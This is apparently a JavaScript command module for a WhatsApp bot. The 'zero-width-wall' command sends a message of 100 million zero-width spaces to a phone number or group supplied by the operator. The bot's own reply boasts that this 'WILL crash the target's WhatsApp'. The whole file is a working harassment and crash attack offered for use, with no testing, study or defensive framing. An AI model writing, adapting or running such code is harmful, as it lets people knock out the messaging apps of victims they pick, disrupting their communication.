export default {
  name: "zero-width-wall",
  description: "Send walls of Zero-Width Spaces crash",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?zero-width-wall <number/group>\n\nExample:\n?zero-width-wall 234XXXXXXXXXX\n?zero-width-wall 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing zero-width-wall on target: ${target}`);

      // Generate zero-width wall payload
      const payload = "\u200B".repeat(100_000_000);

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 Zero-width wall sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] Zero-width-wall command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send zero-width wall: " + error.message
      });
    }
  }
};